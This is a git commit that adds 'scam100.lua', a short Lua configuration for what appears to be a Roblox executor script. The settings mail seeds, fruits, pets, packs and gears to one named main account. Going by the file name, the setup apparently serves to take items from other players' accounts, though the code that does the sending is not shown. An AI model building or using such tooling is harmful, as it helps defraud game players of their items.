432cf7f0f0b754273a2e2a6bda3ef338f23a6e0a
ChalarmZ <keemzanznr4747@gmail.com>
2026-06-16 16:20:12 +0700

    Create scam100.lua

---
+++ scam100.lua
@@ -0,0 +1,9 @@
+getgenv().HB_MailConfig = {
+        MainUsername = "Chalarm_KawZ",  -- 
+        SendSeeds    = true,
+        SendAllSeeds = true,   -- true = ()
+        SendFruits   = true,   
+        SendPets     = true,  
+        SendPacks    = true,   
+        SendGears    = true,   
+    }
